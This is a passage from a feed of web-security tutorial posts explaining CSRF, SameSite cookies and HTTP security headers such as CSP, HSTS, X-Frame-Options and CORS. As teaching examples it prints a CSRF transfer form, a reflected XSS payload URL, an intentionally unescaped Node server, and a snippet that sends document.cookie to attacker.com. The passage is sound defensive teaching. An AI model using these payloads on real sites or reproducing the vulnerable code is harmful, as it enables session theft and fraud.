+and a few additional parameters (destination account and amount) &mdash; when the website
+receives a <code>POST</code> request with those parameters and your session cookie, it will
+process the transfer. Now, suppose a malicious 3rd party website sets up an HTML form as
+such:</p>
+
+<p><code>
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+&lt;input type="hidden" name="destination" value="attacker@email.com" /&gt;
+&lt;input type="hidden" name="amount" value="1000" /&gt;
+&lt;input type="submit" value="CLICK HERE TO WIN A HUMMER" /&gt;
+&lt;/form&gt;
+</code></p>
+
+<p>See where this is getting? If you click on the submit button, cleverly disguised
+as an attractive prize, $1000 is going to be transferred from your account. This
+is a cross-site request forgery &mdash; nothing more, nothing less.</p>
+
+<p>Traditionally, there have been 2 ways to get rid of CSRF:</p>
+
+<ul>
+<li><code>Origin</code> and <code>Referer</code> headers: the server could verify that these headers come from trusted sources (ie. <code>https://bank.com</code>).
+The downside of this approach is that, as we&rsquo;ve seen earlier in this series, neither
+the <code>Origin</code> nor the <code>Referer</code> are very reliable and could be &ldquo;turned off&rdquo; by the client
+in order to protect the user&rsquo;s privacy.</li>
+<li>CSRF tokens: the server could include a signed token in the form, and verify its validity
+once the form is submitted. This is a generally solid approach and it&rsquo;s been the
+recommended best practice for years. The drawback of CSRF tokens is that they&rsquo;re
+a technical burden for the backend, as you&rsquo;d have to integrate token generation
+and validation in your web application: this might not seem a
+complicated task, but a simpler solution would be more than welcome.</li>
+</ul>
+
+
+<p><code>SameSite</code> cookies aim to supersede the solutions mentioned above once and for all:
+when you tag a cookie with this flag, you tell the browser not to include the cookie
+in requests that were generated by different origins. When the browser initiates
+a request to your server and a cookie is tagged as <code>SameSite</code>, the browser will
+first check whether the origin of the request is the same origin that issued the
+cookie: if it&rsquo;s not, the browser will not include the cookie in the request.</p>
+
+<p>We can have a practical look at <code>SameSite</code> with the example at
+<a href="https://github.com/odino/wasec/tree/master/cookies">github.com/odino/wasec/tree/master/cookies</a>:
+when you browse to <a href="http://wasec.local:7888/?samesite=on">wasec.local:7888/?samesite=on</a>
+the server will set a <code>SameSite</code> cookie and a &ldquo;regular&rdquo; one.</p>
+
+<p><img class="center" src="/images/wasec/cookies-ss-on.png"></p>
+
+<p>If we then visit <a href="http://wasec2.local:7888/same-site-form">wasec2.local:7888/same-site-form</a>
+we will see an example HTML form that will trigger a cross-site request:</p>
+
+<p><img class="center" src="/images/wasec/cookies-ss-form.png"></p>
+
+<p>If we click on the submit button of the form, we will then be able to understand
+the true power of this flag &mdash; the form will redirect us to <a href="http://wasec.local:7888/">wasec.local:7888</a>,
+but there is no trace of the <code>SameSite</code> cookie in the request made by the browser:</p>
+
+<p><img class="center" src="/images/wasec/cookies-ss-ok.png"></p>
+
+<p>Don&rsquo;t get confused by seeing <code>same_site_cookie=test</code> on your screen: the cookie
+is made available by the browser, but it wasn&rsquo;t sent in the request itself. We
+can verify this by simply typing <code>http://wasec.local:7888/</code> in the address bar:</p>
+
+<p><img class="center" src="/images/wasec/cokies-ss-lax.png"></p>
+
+<p>Since the originator of the request is &ldquo;safe&rdquo; (no origin, <code>GET</code> method) the browser
+sends the <code>SameSite</code> cookie with the request.</p>
+
+<p>This ingenious flag has 2 variants: <code>Lax</code> and <code>Strict</code>. Our example uses the
+former, as it allows top-level navigation to a website to include the cookie;
+when you tag a cookies as <code>SameSite=Strict</code> instead, the browser will not send
+the cookie across any cross-origin request, including top-level navigation: this
+means that if you click a link to a website that uses <code>strict</code>
+cookies you won&rsquo;t be logged in at all &mdash; an extremely high amount of protection
+that, on the other hand, might surprise users. The <code>Lax</code> mode allows these cookies
+to be sent across requests using safe methods (such as <code>GET</code>), creating a very
+useful mix between security and user experience.</p>
+
+<blockquote><h2>Cookie flags are important</h2>
+
+<p>Let&rsquo;s recap what we&rsquo;ve learned about cookies flags as they are crucial when
+you&rsquo;re storing, or allowing access to, sensitive data through them &mdash; which
+is a very standard practice:</p>
+
+<ul>
+<li>marking cookies as <code>Secure</code> will make sure that they won&rsquo;t be sent across
+unencrypted requests, rendering man-in-the-middle attacks fairly useless</li>
+<li>with the <code>HttpOnly</code> flag we tell the browser not to share the cookie with the
+client (eg. allowing JavaScript access to the cookie), limiting the blast radius
+of an XSS attack</li>
+<li>tagging the cookie as <code>SameSite=Lax|Strict</code> will prevent the browser from sending
+it in cross-origin requests, rendering any kind of CSRF attack ineffective</li>
+</ul>
+</blockquote>
+
+<h2>Alternatives</h2>
+
+<p>Reading all of this material about cookies and security you might be tempted to
+say &ldquo;I really want to stay away from cookies!&rdquo;: the reality is that, as of now,
+cookies are your best bet if you want to implement some sort of session mechanism
+over HTTP. Every now and then I&rsquo;m asked to evaluate alternatives to cookies,
+so I&rsquo;m going to try and summarize a couple things that get mentioned very often:</p>
+
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">localStorage</a>: especially in the context of single-page applications (SPA), localStorage gets
+sometimes mentioned when discussing where to store sensitive tokens: the problem
+with this approach, though, is that localStorage does not offer any kind of
+protection against XSS attacks. If an attacker is able to execute a simple
+<code>localStorage.getItem('token')</code> on a victim&rsquo;s browser, it&rsquo;s game over. <code>HttpOnly</code>
+cookies easily overcome this issue.</li>
+<li><a href="https://jwt.io/">JWT</a>: JSON Web Tokens define a way to securely create access tokens for a client. JWT
+is a specification that defines how an access token would look like and does not
+define where is the token going to be stored. In other words, you could store a
+JWT in a cookie, the localStorage or even in memory &mdash; so it doesn&rsquo;t make sense
+to consider JWTs an &ldquo;alternative&rdquo; to cookies.</li>
+</ul>
+
+
+<h2>What would <em>LeBron</em> do?</h2>
+
+<p><img class="right" src="/images/lebron.jpeg"></p>
+
+<p>It&rsquo;s time to move on from the HTTP protocol and its features, such as cookies:
+we&rsquo;ve been on a long journey, dissecting why cookies were born, how they&rsquo;re
+structured and how you can protect them by applying some restrictions on their
+<code>Domain</code>, <code>Expires</code>, <code>Max-Age</code> and <code>Path</code> attributes, and how other flags such as
+<code>Secure</code>, <code>HttpOnly</code> and <code>SameSite</code> are vital in hardening cookies.</p>
+
+<p>Let&rsquo;s move forward and try to understand what we should do, from
+a security perspective, when we encounter a particular situation: the next article
+will try to provide advice based on best practices and past experience.</p>
+
+<p>It&rsquo;s time to introduce the <em>situationals</em>.</p>
+
+<p>
+
+
+
+<div class="series_nav">
+  
+  
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Secure Your Web Application With These HTTP Headers]]></title>
+    <link href="https://odino.org/secure-your-web-application-with-these-http-headers/"/>
+    <updated>2018-08-23T12:52:00+00:00</updated>
+    <id>https://odino.org/secure-your-web-application-with-these-http-headers</id>
+    <content type="html"><![CDATA[<p><ol class="aseries">
+	<p>This post is part of the "<strong><a href="/categories/wasec/">WASEC: Web Application SECurity</a></strong>" series, which is a portion of the content of <a href="https://leanpub.com/wasec">WASEC</a>, an e-book on web application security I've written.</p>
+	<p>Here is a list of all the articles in this series:</p>
+	<li>
+		<a href="/web-security-demistified/">Web security demystified: WASEC</a>
+	</li>
+	<li>
+		<a href="/introduction-to-web-application-security/">Introduction</a>
+	</li>
+	<li>
+		<a href="/wasec-understanding-the-browser/">Understanding the browser</a>
+	</li>
+	<li>
+		<a href="/security-https-perspective/">Security at the HTTP level</a>
+	</li>
+	<li>
+		<a href="/secure-your-web-application-with-these-http-headers/">HTTP headers to secure your application</a>
+	</li>
+	<li>
+		<a href="/security-hardening-http-cookies/">Hardening HTTP cookies</a>
+	</li>
+	<li>
+		<a href="/wasec-web-application-security-what-to-do-when-dot-dot-dot/">Situationals</a>
+	</li>
+	</br>
+	<p>
+		If you've enjoyed the content of this article, consider buying the complete ebook on either the <a href="https://www.amazon.com/WASEC-Application-Everything-developer-application-ebook/dp/B081Z7SD48">Kindle store</a> or <a href="https://leanpub.com/wasec">Leanpub</a>.
+	</p>
+</ol>
+</p>
+
+<p>As we&rsquo;ve seen, servers can send HTTP headers to provide the client additional metadata
+around the response: beside sending the content that the client requested, clients
+are then allowed to specify how a particular resource should be read, cached or
+secured.</p>
+
+<p>There&rsquo;s currently a very large spectrum of security-related headers that we should
+understand, as they have been implemented by browsers in order to make it harder
+for attackers to take advantage of vulnerabilities: the next paragraphs try to
+summarize each and every one of them by explaining how they&rsquo;re used, what kind of
+attacks they prevent and a bit of history behind each header.</p>
+
+<!-- more -->
+
+
+<h2>HSTS</h2>
+
+<p>Since late 2012, HTTPS-everywhere believers have found it easier to force a client
+to always use the secure version of the HTTP protocol, thanks to the <em>HTTP Strict
+Transport Security</em>: a very simple <code>Strict-Transport-Security: max-age=3600</code> will
+tell the browser that for the next hour (3600 seconds) it should not interact with
+the applications with insecure protocols.</p>
+
+<p>When a user tries to access an application secured by HSTS through HTTP, the browser
+will simply refuse to go ahead, automatically converting <code>http://</code> URLs to <code>https://</code>.</p>
+
+<p>You can test this locally with the code at <a href="https://github.com/odino/wasec/tree/master/hsts">github.com/odino/wasec/tree/master/hsts</a>.
+You will need to follow the instructions in the README (they involve installing a trusted SSL
+certificate for <code>localhost</code> on your machine, through the amazing <a href="https://github.com/FiloSottile/mkcert">mkcert</a> tool)
+and then try opening <code>https://localhost:7889</code>: there are 2 servers in this example,
+an HTTPS one listening on <code>7889</code>, and an HTTP one on port <code>7888</code>. When you access
+the HTTPS server, it will always try to redirect you to the HTTP version, which will work since there is no HSTS policy on the HTTPS server.
+If you instead add the <code>hsts=on</code> parameter in your URL, the browser will forcefully
+convert the link in the redirect to its <code>https://</code> version. Since the server at <code>7888</code>
+is http-only, you will end staring at a page that looks more or less like this:</p>
+
+<p><img class="center" src="/images/wasec/hsts-no.png"></p>
+
+<p>You might be wondering what happens the first time a user visits your website, as
+there is no HSTS policy defined beforehand: attackers could potentially trick
+the user to the <code>http://</code> version of your website and perpetrate their attack there,
+so there&rsquo;s still room for problems. That&rsquo;s a valid concern, as HSTS is a
+<em>trust on first use</em> mechanism: what it tries to do is to make sure that,
+once you&rsquo;ve visited a website, the browser knows that subsequent interaction must
+use HTTPS.</p>
+
+<p>A way around this shortcoming would be to maintain a huge database of websites that enforce HSTS,
+something that Chrome does through <a href="https://hstspreload.org/">hstspreload.org</a>:
+you must first set your policy, then visit the website and check whether it&rsquo;s
+eligible to be added to the database. For example, we can see Facebook made the
+list:</p>
+
+<p><img class="center" src="/images/wasec/hsts-preload-fb.png"></p>
+
+<p>By submitting your website on this list, you can tell browsers in advance that your
+site uses HSTS, so that even the first interaction between clients and your server
+will be over a secure channel &mdash; but this comes at a cost: you really need to commit
+to HSTS. If, by any chance, you&rsquo;d like your website to be removed from the list
+that&rsquo;s no easy task for browser vendors:</p>
+
+<blockquote><p><em>Be aware that inclusion in the preload list cannot easily be undone.</em></p>
+
+<p><em>Domains can be removed, but it takes months for a change to reach users with
+a Chrome update and we cannot make guarantees about other browsers. Don&rsquo;t request
+inclusion unless you&rsquo;re sure that you can support HTTPS for your entire site
+and all its subdomains the long term.</em></p>
+
+<p><a href="https://hstspreload.org/">https://hstspreload.org/</a></p></blockquote>
+
+<p>This happens because the vendor cannot guarantee that all users will be on the
+latest version of their browser, with your site removed from the list. Think
+carefully, and make a decision based on your degree of confidence in HSTS and your
+ability to support it on the long run.</p>
+
+<h2>HPKP</h2>
+
+<p>HTTP Public Key Pinning (abbr. HPKP) is a mechanism that allows us to advertise to
+the browser which SSL certificates to expect whenever it connects to our servers:
+it is a <em>trust on first use</em> header, just like HSTS, meaning that, once the client
+connects to our server, it will store the certificate&rsquo;s info for subsequent interactions.
+If, at any point in time, the client detects that another certificate is being used by
+the server, it will politely refuse to connect, rendering <em>man in the middle</em> (MITM)
+attacks very hard to pull off.</p>
+
+<p>This is how a HPKP policy looks like:</p>
+
+<p><code>
+Public-Key-Pins:
+  pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu=";
+  pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3=";
+  max-age=3600; includeSubDomains;
+  report-uri="https://pkpviolations.example.org/collect"
+</code></p>
+
+<p>The header advertises what certificates the server will use (in this case it&rsquo;s two of them)
+using a hash of the certificates, and includes additional information such as
+the time-to-live of this directive (<code>max-age=3600</code>), and a few other details. Sadly,
+there&rsquo;s no point in digging deeper to understand what we can do with public key pinning,
+as <a href="https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ">this feature is being deprecated by Chrome</a> &mdash; a signal that its adoption is
+destined to plummet very soon.</p>
+
+<p>Chrome&rsquo;s decision is not irrational, but simply a consequence of the risks
+associated with public key pinning: if you lose your certificate, or simply make a mistake
+while testing, your website is gone (for the duration of the <code>max-age</code> directive,
+which is typically weeks or months). As a result of these potentially catastrophic
+consequences, adoption of HPKP has been extremely low, and there have been incidents
+where <a href="https://www.smashingmagazine.com/be-afraid-of-public-key-pinning/">big-time websites have been unavailable</a> because of a misconfiguration. All considered,
+Chrome decided users were better off without the protection offered by HPKP &mdash; and
+<a href="https://scotthelme.co.uk/im-giving-up-on-hpkp/">security researchers aren&rsquo;t entirely against this decision</a>.</p>
+
+<h2>Expect-CT</h2>
+
+<p>While HPKP has been deprecated, a new header stepped in to prevent fraudulent
+SSL certificates from being served to clients: <code>Expect-CT</code>.</p>
+
+<p>The goal of this header is to inform the browser that it should perform additional
+&ldquo;background checks&rdquo; to ensure the certificate is genuine: when a server uses
+the <code>Expect-CT</code> header, it is fundamentally requesting the client to verify that
+the certificates being used are present in public Certificate Transparency (CT)
+logs.</p>
+
+<p>The Certificate Transparency initiative is an effort led by Google in order to:</p>
+
+<blockquote><p><em>[provide] an open framework for monitoring and auditing SSL certificates in nearly real time.</em></p>
+
+<p><em>Specifically, Certificate Transparency makes it possible to detect SSL certificates
+that have been mistakenly issued by a certificate authority or maliciously acquired
+from an otherwise unimpeachable certificate authority. It also makes it possible
+to identify certificate authorities that have gone rogue and are maliciously
+issuing certificates.</em></p>
+
+<p><a href="https://www.certificate-transparency.org/">https://www.certificate-transparency.org/</a></p></blockquote>
+
+<p>The header takes this form:</p>
+
+<p><code>
+Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"
+</code></p>
+
+<p>In this example, the server is asking the browser to:</p>
+
+<ul>
+<li>enable CT verification for the current app for a period of 1 hour (3600 seconds)</li>
+<li><code>enforce</code> this policy and prevent access to the app if a violation occurs</li>
+<li>send a report to the given URL if a violation occurs</li>
+</ul>
+
+
+<p>The Certificate Transparency initiative&rsquo;s goal is to detect misissued or malicious
+certificates (and rogue Certificate Authorities) earlier, faster, and more precisely
+than any other method used before. By opting-in using the <code>Expect-CT</code> header,
+you can take advantage of this initiative to improve your app&rsquo;s security posture.</p>
+
+<h2>X-Frame-Options</h2>
+
+<p>Imagine seeing a web page such as this popping in front of your screen:</p>
+
+<p><img class="center" src="/images/wasec/win-hummer.png"></p>
+
+<p>As soon as you click on the link, you realize that all the money in your bank
+account is gone. What happened?</p>
+
+<p>You were a victim of a <em>clickjacking</em> attack: an attacker directed you to their
+website, which displays a very attractive link to click. Unfortunately, he also
+embedded in the page an iframe from <code>your-bank.com/transfer?amount=-1&amp;to=attacker@example.com</code>
+but hid it by setting it&rsquo;s opacity to 0%: what then happened is that thought of
+clicking on the original page, trying to win a brand-new hummer, but instead the
+browser captured a click on the iframe &mdash; a dangerous click that confirmed the transfer
+of money. Most banking systems require you to specify a one-time PIN code to confirm
+transactions, but your bank didn&rsquo;t catch up with times and all of your money is gone.</p>
+
+<p>The example is pretty extreme but should let you understand what could be the
+consequences of a <a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/">clickjacking attack</a>: the user intends to click on a particular link,
+while the browser will trigger a click on the &ldquo;invisible&rdquo; page that&rsquo;s been embedded
+as an iframe.</p>
+
+<p>I have included an example of this vulnerability at <a href="https://github.com/odino/wasec/tree/master/clickjacking">github.com/odino/wasec/tree/master/clickjacking</a>.
+If you run the example and try clicking on the &ldquo;appealing&rdquo; link, you will see the
+actual click is intercepted by the iframe, which increases its opacity so that&rsquo;s
+easier for you to spot the problem. The example should be accessible at
+<code>http://localhost:7888</code>:</p>
+
+<p><img class="center" src="/images/wasec/hummer-clicked.png"></p>
+
+<p>Luckily, browsers have come up with a simple solution to the problem: <code>X-Frame-Options</code>
+(abbr. XFO) lets you decide whether your app
+can be embedded as an iframe on external websites. Popularized by Internet Explorer
+8, XFO was first introduced in 2009 and is still supported by all major browsers:
+when a browser sees an iframe, it loads it and verifies that its XFO allows its inclusion
+in the current page before rendering it.</p>
+
+<p><img class="center" src="/images/wasec/xfo-browser.png"></p>
+
+<p>The supported values are:</p>
+
+<ul>
+<li><code>DENY</code>: this web page cannot be embedded anywhere. This is the highest level of protection
+as it doesn&rsquo;t allow anyone to embed our content</li>
+<li><code>SAMEORIGIN</code>: only pages from the same domain as the current one can embed this page.
+This means that <code>example.com/embedder</code> can load <code>example.com/embedded</code> so long as
+its policy is set to <code>SAMEORIGIN</code>. This is a more relaxed policy that allows owners
+of a particular website to embed their own pages across their application</li>
+<li><code>ALLOW-FROM uri</code>: embedding is allowed from the specified URI. We could, for example,
+let an external, authorized website embed our content by using <code>ALLOW-FROM https://external.com</code>.
+This is generally used when you intend to allow a 3rd party to embed your content
+through an iframe</li>
+</ul>
+
+
+<p>An example HTTP response that includes the strictest XFO policy possible looks like:</p>
+
+<p>```
+HTTP/1.1 200 OK
+Content-Type: application/json
+X-Frame-Options: DENY</p>
+
+<p>&hellip;
+```</p>
+
+<p>In order to showcase how browsers behave when XFO is enabled, we can simply change
+the URL of our example to <code>http://localhost:7888/?xfo=on</code>. The <code>xfo=on</code> parameter
+tells the server to include <code>X-Frame-Options: deny</code> in the response, and we can
+see how the browser restricts access to the iframe:</p>
+
+<p><img class="center" src="/images/wasec/hummer-xfo.png"></p>
+
+<p>XFO has been considered the best way to prevent frame-based clickjacking attacks
+until another header came into play years later: the Content Security Policy.</p>
+
+<h2>Content-Security-Policy</h2>
+
+<p>The <code>Content-Security-Policy</code> header, often abbreviated to CSP, provides a next-generation
+utility belt for preventing a plethora of attacks, ranging from XSS (cross-site scripting)
+to clickjacking.</p>
+
+<p>To understand how CSP helps us, we should first think of an attack vector: let&rsquo;s
+say we just built our own Google Search, a simple input text with a submit button.</p>
+
+<p><img class="center" src="/images/wasec/own-google-xss.png"></p>
+
+<p>This web application does nothing magical: displays a form, lets the user
+execute a search and displays the search results alongside with the keyword the
+user searched for. When we execute a simple search, this is what the application
+returns:</p>
+
+<p><img class="center" src="/images/wasec/xss-lovely-kitten.png"></p>
+
+<p>Amazing: our application incredibly understood our search and found a related image.
+If we dig deeper in the source code, available at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a>,
+we will soon realize that the application presents a security issue, as whatever
+keyword the user searches for is directly printed in the HTML served to the client:</p>
+
+<p>``` js
+var qs = require(&lsquo;querystring&rsquo;)
+var url = require(&lsquo;url&rsquo;)
+var fs = require(&lsquo;fs&rsquo;)</p>
+
+<p>require(&lsquo;http&rsquo;).createServer((req, res) => {
+  let query = qs.parse(url.parse(req.url).query)
+  let keyword = query.search || &lsquo;&rsquo;
+  let results = keyword ? <code>You searched for "${keyword}", we found:&lt;/br&gt;&lt;img src="http://placekitten.com/200/300" /&gt;</code> : <code>Try searching...</code></p>
+
+<p>  res.end(fs.readFileSync(<strong>dirname + &lsquo;/index.html&rsquo;).toString().replace(&lsquo;</strong>KEYWORD<strong>&rsquo;, keyword).replace(&lsquo;</strong>RESULTS__&rsquo;, results))
+}).listen(7888)
+```</p>
+
+<p>``` html
+<html>
+  <body></p>
+
+<pre><code>&lt;h1&gt;Search The Web&lt;/h1&gt;
+&lt;form&gt;
+  &lt;input type="text" name="search" value="__KEYWORD__" /&gt;
+  &lt;input type="submit" /&gt;
+&lt;/form&gt;
+&lt;div id="results"&gt;
+  __RESULTS__
+&lt;/div&gt;
+</code></pre>
+
+<p>  </body>
+</html>
+```</p>
+
+<p>This presents a nasty consequence: an attacker can craft a specific link that
+executed arbitrary JavaScript on the victim&rsquo;s browser!</p>
+
+<p><img class="center" src="/images/wasec/xss-pwned.png"></p>
+
+<p>If you have the time and patience to run the example locally, you will be able
+to quickly understand the power of CSP. I&rsquo;ve added a query string parameter that
+turns CSP on, so we can try navigating to a malicious URL with CSP turned on:</p>
+
+<p><code>
+http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on
+</code></p>
+
+<p><img class="center" src="/images/wasec/xss-mitigated.png"></p>
+
+<p>As you see in the example above, we have told the browser that our CSP policy only
+allows scripts included from the same origin of the current URL, which we can easily
+verify by curling the URL:</p>
+
+<p>```
+$ curl -I &ldquo;<a href="http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on">http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on</a>&rdquo;</p>
+
+<p>HTTP/1.1 200 OK
+X-XSS-Protection: 0
+Content-Security-Policy: default-src &lsquo;self&rsquo;
+Date: Sat, 11 Aug 2018 10:46:27 GMT
+Connection: keep-alive
+```</p>
+
+<p>Since the XSS attack would be perpetrated through an <em>inline script</em> (a script
+directly embedded in the HTML content), the browser politely refused to execute it,
+keeping our user safe. Imagine if, instead of simply displaying an alert dialog,
+the attacker would have set up a redirect to its own domain, through some JavaScript
+code that could look like:</p>
+
+<p><code>js
+window.location = `attacker.com/${document.cookie}`
+</code></p>
+
+<p>They would have been able to steal all of the user&rsquo;s cookies, which might contain
+highly sensitive data (more on this in the next article).</p>
+
+<p>By now, it should be clear how CSP helps us prevent a range of attacks on web applications:
+you define a policy and the browser will strictly adhere to it, refusing to run
+resources that would violate the policy.</p>
+
+<p>An interesting variation of CSP is the <em>report-only</em> mode: instead of using the
+<code>Content-Security-Policy</code> header, you can first test the impact of CSP on your
+website by telling the browser to simply report errors, without blocking script
+execution and so on, by using the <code>Content-Security-Policy-Report-Only</code> header.</p>
+
+<p>Reporting will allow you to understand what breaking changes the CSP policy you&rsquo;d
+like to roll out might cause, and fix them accordingly &mdash; we can even specify
+a report URL and the browser will send us a report. Here&rsquo;s a full example of a
+report-only policy:</p>
+
+<p><code>
+Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector
+</code></p>
+
+<p>CSP policies can be a bit complex on their own, such as in the following example:</p>
+
+<p><code>
+Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com
+</code></p>
+
+<p>This policy defines the following rules:</p>
+
+<ul>
+<li>executable scripts (eg. JavaScript) can only be loaded from <code>scripts.example.com</code></li>
+<li>images may be loaded from any origin (<code>img-src: *</code>)</li>
+<li>video or audio content can be loaded from two origins: <code>medias.example.com</code> and <code>medias.legacy.example.com</code></li>
+</ul>
+
+
+<p>As you can see, policies can become lengthy, and if we want to
+ensure the highest protection for our users this can become quite of a tedious process;
+nevertheless, writing a comprehensive CSP policy is an important step towards adding
+an additional layer of security to our web applications.</p>
+
+<p>For more information around CSP I would recommend a deep dive at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a>.</p>
+
+<h2>X-XSS-Protection</h2>
+
+<p>Although superseded by CSP, the <code>X-XSS-Protection</code> header provides a similar type
+of protection: unsupported by Firefox, this header is used to
+mitigate XSS attacks in older browsers that don&rsquo;t fully support CSP.</p>
+
+<p>Its syntax is very similar to what we&rsquo;ve just seen:</p>
+
+<p><code>
+X-XSS-Protection: 1; report=http://xssviolations.example.com/collector
+</code></p>
+
+<p>Reflected XSS is the most common type of attack, where an unsanitized input gets
+printed by the server without any validation, and it&rsquo;s where this header truly
+shines. If you want to see this yourself, I would recommend to try out the example
+at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a>
+as, by appending <code>xss=on</code> to the URL, it shows what a browser does when XSS protection
+is turned on. If we enter a malicious string in our search box, such as
+<code>&lt;script&gt;alert('hello')&lt;/script&gt;</code>, the browser will politely refuse to execute the
+script, and explain the reasoning behind its decision:</p>
+
+<p><code>
+The XSS Auditor refused to execute a script in
+'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on'
+because its source code was found within the request.
+The server sent an 'X-XSS-Protection' header requesting this behavior.
+</code></p>
+
+<p>Even more interesting is Chrome&rsquo;s default behavior when the webpage does not specify
+any CSP or XSS policy, a scenario we can test by adding the <code>xss=off</code> parameter
+to our URL (<code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code>):</p>
+
+<p><img class="center" src="/images/wasec/xss-auditor.png"></p>
+
+<p>Amazing, Chrome&rsquo;s cautious enough that it will prevent the page from rendering,
+making reflected XSS very difficult to pull off &mdash; it&rsquo;s impressive to see how far
+browsers have come.</p>
+
+<h2>Feature policy</h2>
+
+<p>In July 2018, security researches <a href="https://scotthelme.co.uk/">Scott Helme</a> published a very interesting <a href="https://scotthelme.co.uk/a-new-security-header-feature-policy/">blog
+post</a> detailing a new security header in the making: <code>Feature-Policy</code>.</p>
+
+<p>Currently supported by very few browsers (Chrome and Safari at the time of writing),
+this header lets us define whether a specific browser feature is enabled within
+the current page: with a syntax very similar to CSP, we should have no issue
+understanding what a feature policy such as the following one means:</p>
+
+<p><code>
+Feature-Policy: vibrate 'self'; push *; camera 'none'
+</code></p>
+
+<p>If we still have a few doubts about how this policy impacts the browser APIs available
+to the page, we can simply dissect it:</p>
+
+<ul>
+<li><code>vibrate 'self'</code>: this will allow the current page to use the vibration API and any nested browsing contexts (iframes) on the same origin</li>
+<li><code>push *</code>: the current page and any iframe can use the push notification API</li>
+<li><code>camera 'none'</code>: access to the camera API is denied to the current page and any nested context (iframes)</li>
+</ul>
+
+
+<p>The feature policy might have a short history, but it doesn&rsquo;t hurt to get a head
+start: if your website allows users to, for example, take a selfie or record audio,
+it would be quite beneficial to use a policy that restricts other contexts from
+accessing the API through your page.</p>
+
+<h2>X-Content-Type-Options</h2>
+
+<p>Sometimes, clever browser features end up hurting us from a security standpoint:
+a clear example is MIME-sniffing, a technique popularized by Internet Explorer.</p>
+
+<p>MIME-sniffing is the ability, for a browser, to auto-detect (and fix) the content type of
+a resource it is downloading: say that, for example, we ask the browser to render
+an image at <code>/awesome-picture.png</code>, but the server sets the wrong
+type when serving it to the browser (ie. <code>Content-Type: text/plain</code>) &mdash; this would
+generally result in the browser not being able to display the image properly.</p>
+
+<p>In order to fix the issue, IE went to great lengths to implement a MIME-sniffing
+capability: when downloading a resource, the browser would &ldquo;scan&rdquo; it and, if it
+would detect that the resource&rsquo;s content type is not the one advertised by the
+server in the <code>Content-Type</code> header, it would ignore the type sent by the server
+and interpret the resource according to the type detected by the browser.</p>
+
+<p>Now, imagine hosting a website that allows users to upload their own images, and
+imagine a user uploading a <code>/test.jpg</code> file that contains JavaScript code. See
+where this is going? Once the file is uploaded, the site would include it in its own
+HTML and, when the browser would try to render the document, it would find the &ldquo;image&rdquo; the user
+just uploaded. As the browser downloads the image, it would detect that it&rsquo;s a script
+instead, and execute it on the victim&rsquo;s browser.</p>
+
+<p>To avoid this issue, we can set the <code>X-Content-Type-Options: nosniff</code> header that
+completely disables MIME-sniffing: by doing so, we are telling the browser that
+we&rsquo;re fully aware that some file might have a mismatch in terms of type and content,
+and the browser should not worry about it &mdash; we know what we&rsquo;re doing, so the browser
+shouldn&rsquo;t try to guess things, potentially posing a security threat to our users.</p>
+
+<h2>CORS</h2>
+
+<p>On the browser, through JavaScript, HTTP requests can only be triggered across the
+same origin: simply put, an AJAX request from <code>example.com</code> can only connect to
+<code>example.com</code>.</p>
+
+<p>This is because your browser contains useful information for an attacker: cookies,
+which are generally used to keep track of the user&rsquo;s session. Imagine if an attacker
+would set up a malicious page at <code>win-a-hummer.com</code> that immediately triggers an
+AJAX request to <code>your-bank.com</code>: if you&rsquo;re logged in on the bank&rsquo;s website, the
+attacker would then be able to execute HTTP requests with your credentials, potentially
+stealing information or, worse, wiping your bank account out.</p>
+
+<p>There might be some cases, though, that require you to execute cross-origin AJAX
+requests, and that is the reason browsers implement Cross Origin Resource Sharing (abbr. CORS),
+a set of directives that allow you to execute cross-domain requests.</p>
+
+<p>The mechanics behind CORS are quite complex, and it won&rsquo;t be practical for us to
+go over the whole specification, so I am going to focus on a &ldquo;stripped down&rdquo; version
+of CORS: all you need to know, for now, is that by using the <code>Access-Control-Allow-Origin</code>
+header, your application tells the browser that it&rsquo;s ok to receive requests from
+other origins.</p>
+
+<p>The most relaxed form of this header is <code>Access-Control-Allow-Origin: *</code>, which
+allows any origin to access our application, but we can restrict it by simply
+adding the URL we want to whitelist with <code>Access-Control-Allow-Origin: https://example.com</code>.</p>
+
+<p>If we take a look at the example at <a href="https://github.com/odino/wasec/tree/master/cors">github.com/odino/wasec/tree/master/cors</a>
+we can clearly see how the browser prevents access to a resource on a separate origin:
+I have set up the example to make an AJAX request from <code>test-cors</code> to <code>test-cors-2</code>,
+and print the result of the operation to the browser. When the server behind <code>test-cors-2</code>
+is instructed to use CORS, the page works as you would expect &mdash; try navigating to
+<code>http://cors-test:7888/?cors=on</code>:</p>
+
+<p><img class="center" src="/images/wasec/cors-ok.png"></p>
+
+<p>But when we remove the <code>cors</code> parameter from the URL, the browser intervenes and
+prevents us from accessing the content of the response:</p>
+
+<p><img class="center" src="/images/wasec/cors-ko.png"></p>
+
+<p>An important aspect we need to understand is that the browser executed the request,
+but prevented the client from accessing it: this is extremely important, as it still
